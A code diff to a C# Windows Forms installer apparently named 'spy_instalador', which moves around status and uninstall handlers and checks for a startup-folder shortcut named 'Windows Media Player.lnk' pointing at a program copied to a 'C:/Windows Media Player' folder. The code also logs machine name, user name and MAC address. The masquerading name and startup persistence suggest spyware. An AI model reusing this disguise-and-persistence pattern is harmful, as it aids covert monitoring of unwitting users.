@@ -1,3 +1,4 @@
+using System.Net;
 using System.Net.NetworkInformation;
 using System.Numerics;
 
@@ -78,7 +79,10 @@ namespace spy_instalador
 
             if (!File.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + user + ".txt"))
             {
-                //File.Create("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png");
+
+
+
+
 
                 File.WriteAllText("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + user + ".txt", "");
             }
@@ -93,10 +97,6 @@ namespace spy_instalador
 
 
             File.WriteAllText("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".txt", texto);
-
-
-
-
 
 
         }
@@ -198,32 +198,27 @@ namespace spy_instalador
 
         }
 
-        private void button3_Click(object sender, EventArgs e)
-        {
-            //C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+         
 
 
-        }
-
-        private void button4_Click(object sender, EventArgs e)
+        private void timer1_Tick(object sender, EventArgs e)
         {
             string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
             b += "/Microsoft/Windows/Start Menu/Programs/Startup";
 
             if (File.Exists(b + "/Windows Media Player.lnk"))
             {
-                File.Delete(b + "/Windows Media Player.lnk");
+                label2.Text = "Instalado";
             }
-
+            else
+            {
+                label2.Text = "Não Instalado";
+            }
         }
 
-        private void button3_Click_1(object sender, EventArgs e)
+        private void button3_Click(object sender, EventArgs e)
         {
-            string arq1 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.exe";
-            string arq2 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.deps.json";
-            string arq3 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.dll";
-            string arq4 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.pdb";
-            string arq5 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.runtimeconfig.json";
 
             string arq1_2 = "C:/Windows Media Player/Windows.exe";
             string arq2_2 = "C:/Windows Media Player/Windows.deps.json";
@@ -268,22 +263,6 @@ namespace spy_instalador
 
             MessageBox.Show("Desinstalado com sucesso!");
 
-
-        }
-
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-            string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            b += "/Microsoft/Windows/Start Menu/Programs/Startup";
-
-            if (File.Exists(b + "/Windows Media Player.lnk"))
-            {
-                label2.Text = "Instalado";
-            }
-            else
-            {
-                label2.Text = "Não Instalado";
-            }
         }
     }
 }
